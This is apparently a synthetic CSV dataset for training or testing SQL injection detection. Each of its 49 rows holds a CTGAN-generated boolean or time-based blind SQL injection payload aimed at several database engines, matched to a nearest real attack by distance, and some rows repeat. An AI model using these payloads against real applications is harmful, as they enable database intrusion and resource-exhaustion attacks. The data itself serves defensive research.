id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,5.871330284051885
CTGAN_000002,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000532,6.496254487692053
CTGAN_000003,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",nearest_attack_euclidean,R000226,6.353537133535407
CTGAN_000004,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000296,5.931455167318286
CTGAN_000005,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",nearest_attack_euclidean,R000202,5.4583082314519915
CTGAN_000006,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000366,4.596896960940935
CTGAN_000007,attack,boolean,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000193,6.269087484075236
CTGAN_000008,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000321,4.1763407143351055
CTGAN_000009,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000485,4.958045470661703
CTGAN_000010,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R000512,6.088570084769614
CTGAN_000011,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000047,5.387072110014065
CTGAN_000012,attack,boolean,"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",nearest_attack_euclidean,R000220,4.609086594819555
CTGAN_000013,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,5.619361667679026
CTGAN_000014,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000414,5.185794550978138
CTGAN_000015,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000213,5.480056253433785
CTGAN_000016,attack,boolean,"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",nearest_attack_euclidean,R000410,6.677931685006222
CTGAN_000017,attack,boolean,"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R000217,6.869772319360583
CTGAN_000018,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000647,7.701131032670124
CTGAN_000019,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,5.396349063023434
CTGAN_000020,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000106,6.338961519921
CTGAN_000021,attack,boolean,"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",nearest_attack_euclidean,R000309,4.502907950960845
CTGAN_000022,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",nearest_attack_euclidean,R000440,4.807985267901822
CTGAN_000023,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000167,5.277401659694037
CTGAN_000024,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000716,5.95019638314538
CTGAN_000025,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000408,5.8707649079371045
CTGAN_000026,attack,boolean,"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000423,5.786758574015986
CTGAN_000027,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R000590,5.15977757384798
CTGAN_000028,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000650,6.790053638481737
CTGAN_000029,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000329,5.374557874070832
CTGAN_000030,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000348,5.3463748056810205
CTGAN_000031,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000106,6.1348275282558955
CTGAN_000032,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,4.145387429351829
CTGAN_000033,attack,boolean,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",nearest_attack_euclidean,R000324,6.9090073597923904
CTGAN_000034,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000209,7.181697863937693
CTGAN_000035,attack,boolean,"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000550,4.767884936304094
CTGAN_000036,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000716,5.203532525206833
CTGAN_000037,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000642,4.855702027718787
CTGAN_000038,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000408,6.157588070598267
CTGAN_000039,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,6.43303310831863
CTGAN_000040,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000737,5.104345837588073
CTGAN_000041,attack,boolean,-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,nearest_attack_euclidean,R000335,7.08481880102092
CTGAN_000042,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000469,4.550573787668887
CTGAN_000043,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000243,6.009803882851861
CTGAN_000044,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R000621,5.496076235920589
CTGAN_000045,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,6.183336212012992
CTGAN_000046,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R000621,6.748466584145728
CTGAN_000047,attack,boolean,"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000246,5.762742595477871
CTGAN_000048,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,4.238832744972517
CTGAN_000049,attack,boolean,"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000340,5.355699219955558
